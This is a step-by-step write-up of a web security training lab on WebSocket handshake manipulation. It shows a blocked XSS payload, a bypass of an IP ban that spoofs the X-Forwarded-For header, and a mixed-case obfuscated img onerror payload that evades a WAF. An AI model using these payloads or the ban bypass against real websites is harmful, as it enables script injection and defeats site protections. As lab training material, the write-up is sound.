# Lab 2 — Manipulating the WebSocket handshake to exploit vulnerabilities

> [← Back to WebSockets](../README.md)

---

## 🎯 Objective
Bypass an IP ban by manipulating the WebSocket handshake headers, then exploit XSS with an obfuscated payload.

---

## 🪜 Steps

### Step 1 — Open Live Chat and send hello
![Step 1 - Live Chat](./screenshots/image74.png)
![Step 1 - Hello](./screenshots/image20.png)

---

### Step 2 — Capture in WebSockets history
See `{"message":"hello"}` in Burp.

![Step 2 - WS History](./screenshots/image52.png)
![Step 2 - Message](./screenshots/image87.png)

---

### Step 3 — Send to Repeater, test XSS payload
Modify to `{"message":"<img src=1 onerror='alert(1)'>"}` → Send.

![Step 3 - XSS Blocked](./screenshots/image13.png)

**Server response:** `{"error":"Attack detected: Event handler"}` — WAF blocks it + bans IP.

![Step 3 - Detected](./screenshots/image68.png)

---

### Step 4 — Reconnect fails (IP banned)
![Step 4 - Reconnect Fail](./screenshots/image89.png)

---

### Step 5 — Bypass IP ban via handshake
Edit the WebSocket handshake request, add:
```
X-Forwarded-For: 1.1.1.1
```
![Step 5 - X-Forwarded-For](./screenshots/image22.png)

---

### Step 6 — Send obfuscated XSS payload
```json
{"message":"<img src=1 oNeRrOr=alert`1`>"}
```
Mixed case on the event handler bypasses the WAF filter.

![Step 6 - Obfuscated Payload](./screenshots/image7.png)

---

### Step 7 — XSS fires
![Step 7 - Alert](./screenshots/image11.png)

---

## ✅ Result
Lab solved!

---

## 💡 Key Takeaway
IP bans are bypassable with `X-Forwarded-For`. WAF keyword filters fail against case obfuscation.
